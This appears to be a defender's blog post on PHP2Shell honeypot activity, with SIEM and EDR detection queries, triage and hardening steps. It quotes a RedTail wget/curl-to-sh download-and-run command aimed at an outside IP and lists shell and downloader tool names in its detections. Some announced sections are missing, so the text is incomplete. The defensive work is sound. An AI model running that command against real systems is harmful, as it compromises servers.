PHP2Shell in the Wild: Detecting Upload-Progress Abuse, Startup Memory Exhaustion and the Shell That Follows

I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here's the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.

Key Sections: What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web and Server-Log Detections · Endpoint Detections · When It Fires · Hardening · IOCs

Part of my honeypot detection series. Org A runs Splunk with CrowdStrike Falcon. Org B runs Microsoft Sentinel with Defender for Endpoint. The web and PHP-error KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.

1. What Hit the Server

PHP2Shell (CVE-2026-109618 and CVE-2026-109619) is a memory-management flaw in how PHP cleans up after a fatal error during request startup. Request startup is when PHP parses a multipart body into $_POST and $_FILES, before your script runs. So the bug is reachable on any PHP page that accepts a POST, whatever the application does.

I put an unpatched PHP 8.3.35 container online the day after disclosure, deliberately easy to reach: a 2 MB memory limit, and upload progress left in the session file. Here's who came:

  • 21 hours in: a scanner calling itself php2shell-scan/3.1 (authorized-security-assessment) checked whether upload progress was on.
  • Two hours later: a RedTail operator tried to plant PHP in a session file and include it. The request was malformed and couldn't work.
  • Five days in: one source sent 16 large multipart bodies, and PHP logged exactly 16 out-of-memory fatal errors during startup. That's the code path PHP2Shell abuses. No worker crashed.
  • Throughout: two other scanners and the BitSight internet census probed the same feature.

Nothing executed. But the attempts show exactly which logs light up, and where they don't.

(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s php2shell

It failed, and not because of my server. The text fields have no boundary lines in front of them, so PHP's parser threw them away. On a real application with an include bug, a correct version of this request is a one-shot RCE.

Exploit Step 3: Drive PHP out of memory during startup

On 28 October, 2.59.133.151 sent 726 requests, almost all within two minutes. Among them were 16 multipart POSTs of 1.3 to 2.2 MB, in pairs. The container's PHP error log shows one fatal error for each:

[Wed Oct 28 01:48:42.451400 2026] [php:error] [pid 21:tid 21] [client 172.18.0.1:56708] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
172.18.0.1 - - [28/Oct/2026:01:48:42 +0000] "POST / HTTP/1.0" 200 364 "-" "-"
[Wed Oct 28 01:48:43.562341 2026] [php:error] [pid 19:tid 19] [client 172.18.0.1:56710] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
172.18.0.1 - - [28/Oct/2026:01:48:43 +0000] "POST / HTTP/1.0" 200 364 "-" "-"

in Unknown on line 0 means no script was running yet. Memory ran out while PHP was parsing the request. That's the state PHP2Shell needs. The same worker PIDs then served normal requests seconds later, so nothing crashed, and nothing followed. My read is that it was a tool testing whether the target reaches the vulnerable state, and perhaps shaping memory before a real attempt (T1190).

4. Web and Server-Log Detections

For Org B I've parsed the honeypot's nginx log into a WebAccess function. For Org A I've used raw nginx where the body matters, and the CIM Web data model otherwise.

let WebAccess = Syslog
| where SyslogMessage startswith "php_http: "
| extend j = parse_json(substring(SyslogMessage, 10))
| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);

W1. Upload-progress field in a multipart POST

Org B Tested: 36 requests from 17 sources. 3 had PHP or command code in the body.

WebAccess
| where Method == "POST" and ContentType startswith "multipart/form-data"
| where Body has "PHP_SESSION_UPLOAD_PROGRESS"
| extend HasCode = Body has_any ("<?php", "<?=", "system(", "shell_exec", "base64_decode", "passthru")
| summarize Requests = count(), Sources = dcount(SrcIp), WithCode = countif(HasCode), UAs = make_set(UserAgent, 10)

Org A

index=web sourcetype=nginx:access method=POST "multipart/form-data" "PHP_SESSION_UPLOAD_PROGRESS"
| eval has_code=if(match(_raw, "<\?php|<\?=|system\(|shell_exec|base64_decode|passthru"), 1, 0)
| stats count dc(clientip) as sources sum(has_code) as with_code values(http_user_agent) as uas

Real browsers almost never send this field. Some upload widgets do, so check your own apps first. With code in the field, it's high severity.

W2. Including a session file (T1505.003)

Org B Tested: two sources. svs sent 18 (4 answered 200), and the RedTail operator sent 3 (all answered 200, all the normal page).

WebAccess
| where Url contains "sess_" and (Url contains "/tmp/" or Url contains "../" or Url contains "%2Ftmp")
| summarize Requests = count(), Answered200 = countif(Status == 200) by SrcIp

Org A

| tstats count from datamodel=Web where Web.url="*sess_*" (Web.url="*/tmp/*" OR Web.url="*../*" OR Web.url="*%2Ftmp*")
    by Web.src Web.dest Web.status
| rename Web.* as *

A request path containing /tmp/sess_ has no innocent explanation. A 200 means the include parameter exists, so treat it as critical until you've confirmed the response is your normal page.

W3. PHP out of memory during startup: the PHP2Shell precondition

Org B Tested: exactly the 16 errors from the 28 October burst, in two minutes. The PHP error log was the only place this showed up. The web log just showed POSTs answered 200.

Syslog
| where SyslogMessage has "Allowed memory size" and SyslogMessage has "Unknown on line 0"
| summarize Errors = count(), Hosts = dcount(Computer), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by ProcessName

Org A

index=web (sourcetype=apache:error OR sourcetype=php:error OR sourcetype="php-fpm")
    "Allowed memory size" "Unknown on line 0"
| bin _time span=5m
| stats count as oom_errors values(client) as clients by _time host
| where oom_errors >= 3

Ship your PHP error log. Most people don't. A burst of startup OOMs from one client is either a PHP2Shell attempt or a badly broken upload client, and both are worth knowing about. Medium severity, raised to high if E1 or E2 fires on the same host.

W4. The lesson: check your SIEM isn't truncating the evidence

When I tested W1 and W2, the RedTail exploit POSTs were missing. The follow-up GETs were there, but not the 16 to 23 KB uploads. They had reached Sentinel, cut off at about 8 KB, which broke the JSON, so my parser silently dropped them. Big multipart bodies are exactly what this attack sends. Find out what your pipeline cuts:

Syslog
| where SyslogMessage startswith "php_http: "
| extend Parsed = parse_json(substring(SyslogMessage, 10))
| where isnull(Parsed) or isempty(tostring(Parsed.client))
| summarize Unparsed = count(), MaxLen = max(strlen(SyslogMessage)) by Computer

In Splunk, check TRUNCATE in props.conf for your web sourcetype (10,000 bytes by default). Either raise the limit, or log the size and the first part of the body as separate fields, so a cut-off record still parses.

5. Endpoint Detections

E1. PHP worker spawns a shell or downloader (T1059.004, T1105)

Org A

index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
    (ParentBaseFileName IN ("php","php-fpm*","apache2","httpd") OR GrandParentBaseFileName IN ("php","php-fpm*","apache2","httpd"))
    FileName IN ("sh","bash","dash","wget","curl")
| table _time ComputerName UserName ParentBaseFileName FileName CommandLine

Org B

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("php","php-fpm","apache2","httpd")
     or InitiatingProcessParentFileName in~ ("php","php-fpm","apache2","httpd")
| where FileName in~ ("sh","bash","dash","wget","curl")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine

This is the same rule as in the RedTail post, because a successful PHP2Shell ends the same way. It's high severity on any PHP host.

E2. PHP or Apache workers crashing

Memory-corruption exploits rarely land first time. Failed attempts crash workers. My container had zero crashes. On a real server, two or more in ten minutes is worth a look.

Org A

index=linux sourcetype=syslog ("segfault" OR "exit signal Segmentation fault" OR "general protection")
    (process IN ("kernel") OR "apache2" OR "php-fpm" OR "httpd")
| rex "(?<proc>apache2|php-fpm[\d.]*|httpd|php)\[(?<pid>\d+)\]"
| bin _time span=10m
| stats count as crashes values(proc) as procs by _time host
| where crashes >= 2

Org B

Syslog
| where TimeGenerated > ago(7d)
| where SyslogMessage has_any ("segfault", "exit signal Segmentation fault", "general protection")
| where SyslogMessage has_any ("apache2", "php-fpm", "httpd", "php")
| summarize Crashes = count(), Sample = take_any(SyslogMessage) by Computer, bin(TimeGenerated, 10m)
| where Crashes >= 2

E3. Payload fingerprints in the shell command line

Org A

index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
    FileName IN ("sh","bash","dash")
    (CommandLine="*__START__*" OR CommandLine="*svs_p2s*" OR CommandLine="*-s php2shell*" OR CommandLine="*sh -s *")
| table _time ComputerName UserName ParentBaseFileName CommandLine

Org B

DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("sh", "bash", "dash")
| where ProcessCommandLine has_any ("__START__", "svs_p2s") or ProcessCommandLine matches regex @"\bsh\s+-s\s+\w+"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine

sh -s <tag> fed from a pipe is how RedTail passes its campaign tag. Combined with the parent process from E1, it's a near-certain hit.

6. When It Fires

  1. W1 or W2 only: check the PHP version. You need the fixed release for your branch (8.3.36 on 8.3). Check session.upload_progress.enabled too. If you're patched or it's off, close the alert.
  2. W3: look for E1 and E2 on the same host in the same window. If neither fired, record the source and patch.
  3. E1, E2 or E3: Org A Network-contain the host in Falcon. Org B Isolate it in Defender. List /tmp/sess_* files and look for PHP code in them. That's the planted payload, and it's still there afterwards.
  4. Rebuild from a patched image and rotate anything PHP could read.

7. Hardening

  • Patch PHP to the fixed release for your branch (8.3.36 on 8.3).
  • Set session.upload_progress.enabled=0 unless you use it. Almost nobody does.
  • Keep session.upload_progress.cleanup=1 (the default), and put session.save_path somewhere the web user can't include from.
  • Fix include parameters. Never pass user input to include or require.
  • Ship the PHP error log to your SIEM, and check that large web records aren't being truncated.
